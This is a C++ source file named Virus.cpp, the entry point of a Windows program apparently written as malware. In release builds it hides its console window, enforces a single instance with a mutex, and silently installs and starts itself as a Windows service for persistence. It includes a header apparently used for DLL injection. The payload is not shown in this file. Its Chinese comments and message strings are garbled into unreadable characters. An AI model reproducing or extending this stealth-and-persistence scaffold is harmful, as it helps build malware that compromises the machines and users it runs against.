// Virus.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "VirusService.h"
#include "..\..\System\File\FileEx.h"
#include "StartUp.h"
#include "..\..\System\Process\JectDll.h"
#include "..\..\System\system\System.h"
#include "Virus.h"

static bool runAsService = false;

static INT processParams(int argc, _TCHAR * argv[])
{
	INT nRet = 0;
	for(int i = 1; i < argc; i++)
	{
		if(_tcsicmp(argv[i], _T("-service")) == 0)
		{
			runAsService = TRUE;
		}// ���� if(_tcsicmp(argv[i], _T("-service")) == 0)
		if(_tcsicmp(argv[i], _T("-remove")) == 0)
		{
			_tstring szService;
			CFileEx fe;
			if(!fe.GetModuleFileName())
			{
				return 1;
			}// ���� (!fe.GetModuleFileName())
			szService = fe.GetFileTitle();
			CVirusService s(szService.c_str());
			s.UnLoad();
			return 1;
		}// ���� if(_tcsicmp(argv[i], _T("-remove")) == 0)
	}
	return nRet;
}

CVirusService * g_pService;

int _tmain(int argc, _TCHAR* argv[])
{
#ifndef _DEBUG
	FreeConsole();
#endif
	if(processParams(argc, argv))
	{
		return 5;
	} // ���� if(processParams(argc, argv))

	_tstring szService;
	CFileEx fe;
	if(!fe.GetModuleFileName())
	{
		return 1;
	}// ���� (!fe.GetModuleFileName())
	szService = fe.GetFileTitle();
	CVirusService s(szService.c_str());
	g_pService = &s;

	// ʹ���򻥳�����(ͬʱֻ����һ��ʵ��)
	HANDLE hMutex = CreateMutex(NULL, FALSE, szService.c_str());
	if(NULL == hMutex)
	{
#ifdef _DEBUG
		MessageBox(NULL, _T("��������������,�����Ѿ�����!"), NULL, MB_OK);
		return 2;
#endif // ���� #ifdef _DEBUG
	} // ���� if(NULL == hMutex)
	if(GetLastError() == ERROR_ALREADY_EXISTS)
	{
		//CloseHandle(hMutex);
#ifdef _DEBUG
		MessageBox(NULL, _T("�����Ѿ�����!"), NULL, MB_OK);
#endif
		return 3;
	}

	if(runAsService)
	{
		//��Ϊ�������
		s.start();
	}
	else
	{
#ifdef _DEBUG
		s.run();
#else
		//��Ϊ��װ�������
		s.InstallAndStartService();
#endif
	} // ���� if(runAsService)

	if(hMutex)
	{
		CloseHandle(hMutex);
	} // ���� if(hMutex)

	return 0;
}